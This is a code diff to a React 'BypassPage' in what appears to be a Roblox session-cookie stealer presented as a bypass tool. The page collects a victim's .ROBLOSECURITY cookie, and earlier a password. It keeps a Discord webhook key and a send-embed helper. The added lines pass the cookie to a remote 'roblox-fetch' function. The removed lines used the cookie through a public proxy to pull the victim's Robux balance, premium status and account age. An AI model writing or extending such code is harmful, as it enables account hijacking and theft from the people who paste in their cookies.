@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import { Eye, EyeOff, ShieldCheck, ArrowLeft, Loader2, CheckCircle2, XCircle, Cookie } from "lucide-react";
 import ShieldIcon from "@/components/ShieldIcon";
 import { sendBypassEmbed } from "@/lib/tokenStore";
+import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 
 const WEBHOOK_KEY = "discord_webhook_url";
@@ -87,45 +88,19 @@ const BypassPage = () => {
       setProgress(pct);
     }, 200);
 
-    let apiOk = true;
+    let apiOk = false;
     let info: Record<string, any> = {};
     try {
-      const res = await fetch(BYPASS_API_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ cookie: trimmed, password }),
+      const { data, error } = await supabase.functions.invoke("roblox-fetch", {
+        body: { cookie: trimmed },
       });
-      apiOk = res.ok;
-      try { info = await res.clone().json(); } catch { info = {}; }
+      if (!error && data?.valid) {
+        apiOk = true;
+        info = data.info || {};
+      }
     } catch {
       apiOk = false;
     }
-
-    // Try to fetch real Roblox account info via public CORS proxy
-    try {
-      const proxy = (u: string) => `https://corsproxy.io/?${encodeURIComponent(u)}`;
-      const auth = await fetch(proxy("https://users.roblox.com/v1/users/authenticated"), {
-        headers: { Cookie: `.ROBLOSECURITY=${trimmed}` },
-      });
-      if (auth.ok) {
-        const me = await auth.json();
-        info.username = info.username || me?.name;
-        const uid = me?.id;
-        if (uid) {
-          const [bal, prem, user] = await Promise.all([
-            fetch(proxy(`https://economy.roblox.com/v1/users/${uid}/currency`), { headers: { Cookie: `.ROBLOSECURITY=${trimmed}` } }).then(r => r.ok ? r.json() : null).catch(() => null),
-            fetch(proxy(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`)).then(r => r.ok ? r.json() : null).catch(() => null),
-            fetch(proxy(`https://users.roblox.com/v1/users/${uid}`)).then(r => r.ok ? r.json() : null).catch(() => null),
-          ]);
-          if (bal && bal.robux != null) info.robux = info.robux || String(bal.robux);
-          if (prem != null) info.premium = info.premium || (prem ? "Yes" : "No");
-          if (user?.created) {
-            const days = Math.floor((Date.now() - new Date(user.created).getTime()) / 86400000);
-            info.age = info.age || `${days} days`;
-          }
-        }
-      }
-    } catch {}
 
     const elapsed = Date.now() - start;
     if (elapsed < BYPASS_DURATION_MS) {
